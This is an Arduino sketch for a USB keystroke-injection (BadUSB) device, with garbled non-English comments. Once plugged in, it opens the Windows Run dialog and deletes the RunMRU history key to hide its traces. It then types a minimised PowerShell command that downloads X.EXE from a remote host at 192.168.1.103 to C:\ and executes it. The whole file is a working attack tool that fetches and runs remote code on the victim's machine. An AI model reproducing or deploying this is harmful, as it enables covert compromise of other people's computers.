void setup() {//��ʼ��
  Keyboard.begin();//��ʼ����ͨѶ 
  delay(5000);//��ʱ
  Keyboard.press(KEY_LEFT_GUI);//win�� 
  delay(500); 
  Keyboard.press('r');//r�� 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//���ÿ���д��Сд�ƹ����뷨
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN POWERSHELL $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.dOWNLOADfILE('HTTP://192.168.1.103/X.EXE', 'c:\\X.EXE');START c:\\X.EXE;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//��������ͨѶ 
}
void loop()//ѭ��
{
}